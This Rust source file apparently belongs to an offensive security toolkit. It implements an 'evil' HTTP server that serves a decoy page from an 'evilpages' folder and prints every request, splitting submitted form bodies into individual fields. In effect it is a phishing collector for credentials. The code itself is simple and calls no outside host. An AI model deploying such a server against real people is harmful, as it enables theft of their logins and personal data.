use crate::core::core::*;
use std::fs;
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};

fn handle_client(mut stream: TcpStream, file_path: &str) {
    let mut buffer = [0; 65536];
    stream.read(&mut buffer).unwrap();

    let mut path = file_path;
    let default = &get_spellbook_path("evilpages/default/index.html");
    if file_path.is_empty() {
        path = default;
    }

    let index = fs::read_to_string(path).unwrap_or("Index file not found".to_string());

    let request = String::from_utf8_lossy(&buffer);
    let body = request.split("\r\n\r\n").nth(1).unwrap_or("");

    println!("Incoming request:\n");
    println!("⚡ Request: {}\n", &request);
    println!("⚡ Request Body:\n{}\n", &body.replace("&", "\n"));

    let response = if request.starts_with("GET / HTTP/1.1") {
        "HTTP/1.1 200 OK\r\n\r\n@@HTML".replace("@@HTML", &index)
    } else if request.starts_with("POST / HTTP/1.1") {
        "HTTP/1.1 200 OK\r\n\r\n@@HTML".replace("@@HTML", &index)
    } else {
        "HTTP/1.1 404 NOT FOUND\r\n\r\n@@HTML".replace("@@HTML", &index)
    };

    stream.write(response.as_bytes()).unwrap();
    stream.flush().unwrap();
}

/// Starts an "evil" HTTP server that listens for incoming TCP connections and serves files.
///
/// # Parameters
/// - `argsv`: A slice of `String` arguments typically passed from the command line.
///   The function expects the following parameters:
///   - `"address"`: The address and port to bind the server to, e.g., `127.0.0.1:8080`.
///   - `"path"`: The file path to serve content from.
///
/// # Returns
/// - Returns an `i32` exit code, where `0` indicates successful server termination.
///
/// # Behavior
/// 1. The server binds to the address specified by the `address` argument.
/// 2. It prints the address where it is listening, in the format: `Listening on http://<address>`.
/// 3. The server continuously accepts incoming TCP connections:
///    - For each connection, it calls the `handle_client` function with the stream and file path.
///    - If an error occurs while accepting a connection, it logs the error and raises it using the `raise` function.
///
/// # Panics
/// - If the server cannot bind to the specified address, the program will panic with an `unwrap` on the `TcpListener::bind` call.
///
/// # Example
/// ```rust
/// let args = vec![
///     "program".to_string(),
///     "--address".to_string(),
///     "127.0.0.1:8080".to_string(),
///     "--path".to_string(),
///     "/var/www/index.html".to_string(),
/// ];
///
/// let exit_code = evil_server(&args);
/// println!("Server exited with code: {}", exit_code);
/// ```
pub fn evil_server(argsv: &[String]) -> i32 {
    let addrr = search_value("address", argsv);
    let file_path = search_value("path", argsv);
    let listener = TcpListener::bind(&addrr).unwrap();
    println!("{}", format!("Listening on http://{}", &addrr));

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                handle_client(stream, &file_path);
            }
            Err(err) => {
                let msg = format!("Error accepting connection: {:?}", err.to_string());
                raise(&msg, "fail");
            }
        }
    }

    return 0;
}
